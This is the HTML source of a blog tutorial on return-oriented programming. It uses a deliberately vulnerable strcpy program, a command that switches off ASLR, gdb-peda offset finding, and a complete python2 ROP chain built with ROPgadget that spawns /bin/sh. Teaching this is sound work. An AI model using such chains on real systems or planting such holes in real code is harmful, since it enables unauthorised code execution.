@@ -1,0 +1,902 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.23.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Wading through the maze of ROP chains - The Rosh</title>
+<meta name="description" content="Birds Eye View and the Deep Dive Series">
+
+
+  <meta name="author" content="Jaimandeep Singh">
+  
+  <meta property="article:author" content="Jaimandeep Singh">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="The Rosh">
+<meta property="og:title" content="Wading through the maze of ROP chains">
+<meta property="og:url" content="https://cyber-rosh.github.io/musings/buffer%20overflow/rop%20chain/rop-chains/">
+
+
+  <meta property="og:description" content="Birds Eye View and the Deep Dive Series">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2021-06-19T14:34:00+05:30">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="https://cyber-rosh.github.io/musings/buffer%20overflow/rop%20chain/rop-chains/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "The Rosh",
+      "url": "https://cyber-rosh.github.io/musings/"
+    
+  }
+</script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/musings/assets/css/main.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/musings/">
+          The Rosh
+          <span class="site-subtitle">A collection of musings on cyber security</span>
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/musings/posts/">Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/musings/categories">Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/musings/tags">Tags</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Jaimandeep Singh</h3>
+    
+    
+      <div class="author__bio" itemprop="description">
+        <p>Cybersecurity Professional.</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+            <li><a href="https://github.com/jai-the-seeker" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+          
+        
+          
+            <li><a href="https://www.linkedin.com/in/jaimandeep-singh-07834b1b7" rel="nofollow noopener noreferrer"><i class="fab fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
+          
+        
+      
+
+      
+
+      
+        <li>
+          <a href="mailto:karma.jaimandeep@gmail.com">
+            <meta itemprop="email" content="karma.jaimandeep@gmail.com" />
+            <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Wading through the maze of ROP chains">
+    <meta itemprop="description" content="Birds Eye View and the Deep Dive Series">
+    <meta itemprop="datePublished" content="2021-06-19T14:34:00+05:30">
+    
+    
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Wading through the maze of ROP chains
+</h1>
+          
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2021-06-19T14:34:00+05:30">June 19, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          7 minute read
+        
+      </span>
+    
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p align="center"><i>Birds Eye View and the Deep Dive Series</i></p>
+
+<h1 id="birds-eye-view">Birds Eye View</h1>
+<blockquote>
+  <p><strong><em>The main idea of Return Oriented Programming (ROP) is to chain and run the instructions which are already present in the code to the attackers advantage.</em></strong></p>
+</blockquote>
+
+<h3 id="getting-to-know-buffer-overflows">Getting to know Buffer Overflows</h3>
+
+<p>In buffer overflow vulnerabilities one of the most common methods used by the attacker was to write the shellcode onto the stack and then to execute this shellcode. The execution of the shellcode was achieved by controlling the EIP, and pointing it to the start of the shellcode. The buffer overflow attacks have targeted both stack and heap memory regions for exploiting these vulnerabilities.</p>
+
+<blockquote>
+  <p><strong><em>The key to successful buffer overflow attack is to control the Instruction Pointer (IP).</em></strong></p>
+</blockquote>
+
+<p>In order to mitigate the effect of the buffer overflow vulnerabilities we have following mitigations in place:</p>
+
+<ul>
+  <li><strong><em>Stack Canaries</em></strong>: This is a compiler level protection. These are inserted by the compilers at compile time into the binaries. Different compilers have different ways by which they accomplish it.</li>
+  <li><strong><em>Data Execution Prevention (DEP)</em></strong>: This is supported at the hardware level by way of <code class="language-plaintext highlighter-rouge">NX</code> bit. Setting or unsetting this bit will make the address space executable or non-executable. We can control it through software.</li>
+  <li><strong><em>Address Space Layout Randomization (ASLR)</em></strong>: Here we randomize the address space of various segments of the program, so that they don’t have fixed address which can be easily exploited by the malicious actors. ASLR can be enabled or disable at the operation system level. In linux we have additional features to control it at program level also.</li>
+</ul>
+
+<h3 id="where-do-the-rops-fit-in">Where do the ROPs fit in?</h3>
+<p>In Return Oriented Programming (ROP) we chain the gadgets in such a way that we are able to obtain the shell (command prompt) on the vulnerable system. It is primarily used to bypass the DEP safeguards.</p>
+
+<h3 id="and-what-do-you-mean-by-gadgets">And what do you mean by gadgets?</h3>
+<p>Well, these are a group of instructions which end with <code class="language-plaintext highlighter-rouge">ret</code>. Some of the useful ROP gadgets are:</p>
+
+<ul>
+  <li>Loading constant into register <code class="language-plaintext highlighter-rouge">pop eax; ret</code></li>
+  <li>Loading from memory <code class="language-plaintext highlighter-rouge">mov ebx, [eax]; ret</code></li>
+  <li>Store in memory <code class="language-plaintext highlighter-rouge">mov [eax], ebx; ret</code></li>
+  <li>Arithmetic operations <code class="language-plaintext highlighter-rouge">xor eax, eax; ret</code></li>
+  <li>System calls <code class="language-plaintext highlighter-rouge">int 0x80; ret</code></li>
+</ul>
+
+<h1 id="deep-dive">Deep Dive</h1>
+<p>Having the background lets try to take a deep dive and understand what the hullabaloo is about.</p>
+
+<h3 id="our-objective-is-to-launch-binsh-shell">Our objective is to launch <code class="language-plaintext highlighter-rouge">/bin/sh</code> shell</h3>
+
+<p>We will make use of following steps:</p>
+<ul>
+  <li>Write <code class="language-plaintext highlighter-rouge">/bin/sh</code> string in memory</li>
+  <li>Setup <code class="language-plaintext highlighter-rouge">execve</code> syscall number</li>
+  <li>Setup <code class="language-plaintext highlighter-rouge">execve</code> arguments</li>
+  <li>Syscall gadgets</li>
+  <li>Find syscall interrupt</li>
+  <li>Build the ROP chain as a python script</li>
+</ul>
+
+<h3 id="building-the-rop-chain">Building the ROP Chain</h3>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">int execve(const char *filename, char *const argv[], char *const
+envp[]);</code>
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">pop ebx</code> - first argument</li>
+      <li><code class="language-plaintext highlighter-rouge">pop ecx</code> - second argument</li>
+      <li><code class="language-plaintext highlighter-rouge">pop edx</code> - third argument</li>
+    </ul>
+  </li>
+  <li><code class="language-plaintext highlighter-rouge">xor eax, eax</code>
+    <ul>
+      <li>used to initialize the context to zero</li>
+    </ul>
+  </li>
+  <li><code class="language-plaintext highlighter-rouge">inc eax</code>
+    <ul>
+      <li>used 11 times to setup the execve syscall number</li>
+    </ul>
+  </li>
+  <li><code class="language-plaintext highlighter-rouge">int 0x80</code>
+    <ul>
+      <li>syscall exception</li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="example-exploitation">Example Exploitation</h3>
+<p>Let’s take a vulnerable buffer overflow example code:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/*rop.c*/
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+int main(int argc,char *argv[]){
+	char buf[10];
+	strcpy(buf,argv[1]);
+	printf("Buf:%s\n",buf);
+	return 0;
+}
+</code></pre></div></div>
+<h3 id="compiling-the-above-program">Compiling the above program</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gcc -ggdb -m32 -mpreferred-stack-boundary=2 -fno-stack-protector -znoexecstack
+rop.c -o rop
+</code></pre></div></div>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">-m32</code>: For output in 32 bit binary format.</li>
+  <li><code class="language-plaintext highlighter-rouge">ggdb</code>: Enable debug info.</li>
+  <li><code class="language-plaintext highlighter-rouge">mpreferred-stack-boundary</code>: GCC will align stack pointer on <code class="language-plaintext highlighter-rouge">2^2=4byte</code> boundary.</li>
+  <li><code class="language-plaintext highlighter-rouge">fno-stack-protector</code>: To disable stack canaries.</li>
+  <li><code class="language-plaintext highlighter-rouge">znoexecstack</code>: Enable <code class="language-plaintext highlighter-rouge">NX</code> to make stack non executable</li>
+</ul>
+
+<h3 id="disable-aslr">Disable ASLR</h3>
+<p>ASLR has following flags options</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">0</code>:  No Randomization</li>
+  <li><code class="language-plaintext highlighter-rouge">1</code>: Conservative Randomization
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">Shared libraries</code></li>
+      <li><code class="language-plaintext highlighter-rouge">Stack</code></li>
+      <li><code class="language-plaintext highlighter-rouge">Mmap</code></li>
+      <li><code class="language-plaintext highlighter-rouge">VDSO</code></li>
+      <li><code class="language-plaintext highlighter-rouge">Heap</code></li>
+    </ul>
+  </li>
+  <li><code class="language-plaintext highlighter-rouge">2</code> Full Randomization
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">Brk()</code></li>
+    </ul>
+  </li>
+</ul>
+
+<p>For ease of understanding let us switch off the ASLR:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+</code></pre></div></div>
+<h3 id="check-the-security-attributes-of-binary-using-gdb-peda">Check the security attributes of binary using <code class="language-plaintext highlighter-rouge">gdb-peda</code></h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gdb-peda -q ./rop
+Reading symbols from ./rop...done.
+
+gdb-peda$ checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : ENABLED
+RELRO     : FULL
+</code></pre></div></div>
+<h3 id="find-the-offset-to-eip">Find the offset to <code class="language-plaintext highlighter-rouge">EIP</code></h3>
+<p>Now, let’s find the offset to the <code class="language-plaintext highlighter-rouge">EIP</code> in this program using <code class="language-plaintext highlighter-rouge">pattern_create</code> and <code class="language-plaintext highlighter-rouge">pattern_offset</code> commands:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ pattern_create 50 patt.txt
+gdb-peda$ r $(cat patt.txt)
+Stopped reason: SIGSEGV
+0x2d414143 in ?? ()
+gdb-peda$ pattern_offset 0x2d414143
+759251267 found at offset: 18
+</code></pre></div></div>
+<h3 id="find-gadgets-and-build-the-rop-chain">Find gadgets and build the ROP chain</h3>
+<p>We have to find the required gadgets from the <code class="language-plaintext highlighter-rouge">libc</code> library used by our program. In order to find the <code class="language-plaintext highlighter-rouge">libc</code> version, load the program in <code class="language-plaintext highlighter-rouge">gdb-peda</code> and put a breakpoint at <code class="language-plaintext highlighter-rouge">main()</code>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ b main
+</code></pre></div></div>
+<p>Run the program and use <code class="language-plaintext highlighter-rouge">vmmap</code> to see the modules loaded by the program</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ vmmap
+Start      End        Perm	Name
+0x56555000 0x56556000 r-xp	/home/cdac/prac-examples/rop
+0x56556000 0x56557000 r--p	/home/cdac/prac-examples/rop
+0x56557000 0x56558000 rw-p	/home/cdac/prac-examples/rop
+0xf7ddd000 0xf7fb2000 r-xp	/lib/i386-linux-gnu/libc-2.27.so
+0xf7fb2000 0xf7fb3000 ---p	/lib/i386-linux-gnu/libc-2.27.so
+0xf7fb3000 0xf7fb5000 r--p	/lib/i386-linux-gnu/libc-2.27.so
+0xf7fb5000 0xf7fb6000 rw-p	/lib/i386-linux-gnu/libc-2.27.so
+0xf7fb6000 0xf7fb9000 rw-p	mapped
+0xf7fcf000 0xf7fd1000 rw-p	mapped
+...
+</code></pre></div></div>
+<p>Here, we can see the version of <code class="language-plaintext highlighter-rouge">libc</code> that is getting loaded at runtime. <code class="language-plaintext highlighter-rouge">/lib/i386-linux-gnu/libc-2.27.so</code> is getting loaded at the base address of <code class="language-plaintext highlighter-rouge">0xf7ddd000</code>. We will now use the following command to search for gadgets and create a chain using <code class="language-plaintext highlighter-rouge">ROPGadget</code> tool</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ROPgadget --ropchain --binary /lib/i386-linux-gnu/libc-2.27.so &gt; ./gadgets.txt
+</code></pre></div></div>
+<p>The gadgets found will be saved in <code class="language-plaintext highlighter-rouge">gadgets.txt</code> file. At the end of the file we can see that a <code class="language-plaintext highlighter-rouge">python2</code> code will be generated for ROP chain to call <code class="language-plaintext highlighter-rouge">/bin/sh</code>. Let us have a peep inside this file</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Unique gadgets found: 118662
+
+ROP chain generation
+===========================================================
+- Step 5 -- Build the ROP chain
+
+	#!/usr/bin/env python2
+	# execve generated by ROPgadget
+
+	from struct import pack
+
+	# Padding goes here
+	p = ''
+</code></pre></div></div>
+
+<p>The addresses inside the ROP chain will be offsets inside the <code class="language-plaintext highlighter-rouge">libc.so</code> library. We have to add the base address that we have noted earlier. After adding the base address and the offset for the <code class="language-plaintext highlighter-rouge">EIP</code>, the python script will look as follows:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python2
+# execve generated by ROPgadget
+</span>
+<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
+
+<span class="c1"># Offset to EIP
+</span><span class="n">p</span> <span class="o">=</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">18</span>
+<span class="c1"># Add the base address of the libc.so library
+</span><span class="n">base</span> <span class="o">=</span> <span class="mh">0xf7ddd000</span>
+
+<span class="c1"># Put the address of .data section will be moved into edx register
+</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x00001aae</span><span class="p">)</span> <span class="c1"># pop edx ; ret
+</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x001d8040</span><span class="p">)</span> <span class="c1"># @ .data
+</span>
+<span class="c1"># Address of '/bin' string into eax register
+</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x00024c1e</span><span class="p">)</span> <span class="c1"># pop eax ; ret
+</span><span class="n">p</span> <span class="o">+=</span> <span class="s">'/bin'</span>
+
+<span class="c1"># Mov '/bin' string to start of .data section
+</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x00075655</span><span class="p">)</span> <span class="c1"># mov dword ptr [edx], eax ; ret
+</span>
+<span class="c1"># Mov '//sh' string to .data+4 section
+</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x00001aae</span><span class="p">)</span> <span class="c1"># pop edx ; ret
+</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x001d8044</span><span class="p">)</span> <span class="c1"># @ .data + 4
+</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x00024c1e</span><span class="p">)</span> <span class="c1"># pop eax ; ret
+</span><span class="n">p</span> <span class="o">+=</span> <span class="s">'//sh'</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x00075655</span><span class="p">)</span> <span class="c1"># mov dword ptr [edx], eax ; ret
+</span>
+<span class="c1"># Now, we have to give two more arguments to the execve() function, which can be null
+</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x00001aae</span><span class="p">)</span> <span class="c1"># pop edx ; ret
+</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x001d8048</span><span class="p">)</span> <span class="c1"># @ .data + 8
+</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x0002e565</span><span class="p">)</span> <span class="c1"># xor eax, eax ; ret
+</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x00075655</span><span class="p">)</span> <span class="c1"># mov dword ptr [edx], eax ; ret
+</span>
+<span class="c1"># First argument has to be in ebx
+</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x00018c85</span><span class="p">)</span> <span class="c1"># pop ebx ; ret
+</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x001d8040</span><span class="p">)</span> <span class="c1"># @ .data
+</span>
+<span class="c1"># Second argument in ecx register which is null
+</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x001926d5</span><span class="p">)</span> <span class="c1"># pop ecx ; ret
+</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x001d8048</span><span class="p">)</span> <span class="c1"># @ .data + 8
+</span>
+<span class="c1"># Third argument in edx register which is null
+</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x00001aae</span><span class="p">)</span> <span class="c1"># pop edx ; ret
+</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x001d8048</span><span class="p">)</span> <span class="c1"># @ .data + 8
+</span>
+<span class="c1"># Now, we have to place 11 in eax which is number of execve() system call
+</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x0002e565</span><span class="p">)</span> <span class="c1"># xor eax, eax ; ret
+</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x00024bf8</span><span class="p">)</span> <span class="c1"># inc eax ; ret
+</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x00024bf8</span><span class="p">)</span> <span class="c1"># inc eax ; ret
+</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x00024bf8</span><span class="p">)</span> <span class="c1"># inc eax ; ret
+</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x00024bf8</span><span class="p">)</span> <span class="c1"># inc eax ; ret
+</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x00024bf8</span><span class="p">)</span> <span class="c1"># inc eax ; ret
+</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x00024bf8</span><span class="p">)</span> <span class="c1"># inc eax ; ret
+</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x00024bf8</span><span class="p">)</span> <span class="c1"># inc eax ; ret
+</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x00024bf8</span><span class="p">)</span> <span class="c1"># inc eax ; ret
+</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x00024bf8</span><span class="p">)</span> <span class="c1"># inc eax ; ret
+</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x00024bf8</span><span class="p">)</span> <span class="c1"># inc eax ; ret
+</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x00024bf8</span><span class="p">)</span> <span class="c1"># inc eax ; ret
+</span>
+<span class="c1"># Syscall exception
+</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x00002d37</span><span class="p">)</span> <span class="c1"># int 0x80
+</span>
+<span class="k">print</span> <span class="n">p</span>
+</code></pre></div></div>
+<p>To this code we have added the offset to EIP offset which is 18 bytes and also the base address of <code class="language-plaintext highlighter-rouge">libc</code> library. Here the <code class="language-plaintext highlighter-rouge">pack</code> library is used to automatically reverse the address as per little endian format requirements.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./rop $(python rop-exploit.py)
+Buf:AAAAAAAAAAAAAAAAAA����@P����
+$ whoami
+secure
+$ id
+uid=1000(secure) gid=1000(secure) groups=1000(secure)
+</code></pre></div></div>
+<p>Voila!! we have successfully executed the <code class="language-plaintext highlighter-rouge">/bin/sh</code> using ROP chain.</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/musings/tags/#buffer-overflow" class="page__taxonomy-item" rel="tag">Buffer Overflow</a><span class="sep">, </span>
+    
+      <a href="/musings/tags/#dep" class="page__taxonomy-item" rel="tag">DEP</a><span class="sep">, </span>
+    
+      <a href="/musings/tags/#gdb" class="page__taxonomy-item" rel="tag">gdb</a><span class="sep">, </span>
+    
+      <a href="/musings/tags/#return-oriented-programming" class="page__taxonomy-item" rel="tag">Return Oriented Programming</a><span class="sep">, </span>
+    
+      <a href="/musings/tags/#rop-chains" class="page__taxonomy-item" rel="tag">ROP Chains</a><span class="sep">, </span>
+    
+      <a href="/musings/tags/#stack-canaries" class="page__taxonomy-item" rel="tag">Stack Canaries</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/musings/categories/#buffer-overflow" class="page__taxonomy-item" rel="tag">Buffer Overflow</a><span class="sep">, </span>
+    
+      <a href="/musings/categories/#rop-chain" class="page__taxonomy-item" rel="tag">ROP Chain</a>
+    
+    </span>
+  </p>
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2021-06-19T14:34:00+05:30">June 19, 2021</time></p>
+
+
+      </footer>
+
+      <section class="page__share">
+  
+    <h4 class="page__share-title">Share on</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?text=Wading+through+the+maze+of+ROP+chains%20https%3A%2F%2Fcyber-rosh.github.io%2Fmusings%2Fbuffer%2520overflow%2Frop%2520chain%2Frop-chains%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
